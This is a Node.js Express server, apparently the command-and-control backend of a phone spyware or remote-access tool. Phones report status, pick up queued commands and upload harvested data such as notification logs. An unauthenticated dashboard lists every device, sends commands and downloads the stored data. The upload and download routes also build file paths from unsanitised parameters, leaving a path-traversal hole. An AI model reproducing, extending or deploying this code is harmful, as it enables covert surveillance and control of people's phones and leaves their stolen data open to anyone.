const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let devices = {}; 

// 📲 PHONE SIDE
app.post('/api/status', (req, res) => {
    const { device_id, model, battery, version, charging } = req.body; 
    if (!device_id) return res.status(400).json({ error: "No Device ID" });

    const pendingCommand = (devices[device_id] && devices[device_id].command) ? devices[device_id].command : "none";

    devices[device_id] = {
        id: device_id,
        model: model || "Unknown",
        battery: battery || 0,
        version: version || "--",
        charging: charging === 'true' || charging === true,
        lastSeen: Date.now(),
        command: "none" 
    };

    res.json({ status: "success", command: pendingCommand });
});

// 💻 DASHBOARD SIDE - YEH MISSING THA
app.get('/api/device-status/:id', (req, res) => {
    const deviceId = req.params.id;
    const device = devices[deviceId];
    
    if (!device) {
        return res.json({ isOnline: false });
    }
    
    // Agar pichle 1 minute mein phone ka ping aaya hai toh Online
    const isOnline = (Date.now() - device.lastSeen) < 60000; 
    res.json({ ...device, isOnline });
});

app.get('/api/admin/all-devices', (req, res) => {
    res.json(devices);
});

app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!devices[device_id]) {
        devices[device_id] = { id: device_id };
    }
    devices[device_id].command = command;
    res.json({ status: "success" });
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const { device_id, type } = req.params;
    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]); 
});

app.post('/api/upload_data', (req, res) => {
    const { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);

    try {
        let finalData;
        if (type === 'notifications') {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            if (!Array.isArray(existingData)) existingData = [];
            existingData.unshift(parsedData); 
            finalData = existingData.slice(0, 100);
        } else {
            finalData = parsedData;
        }
        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
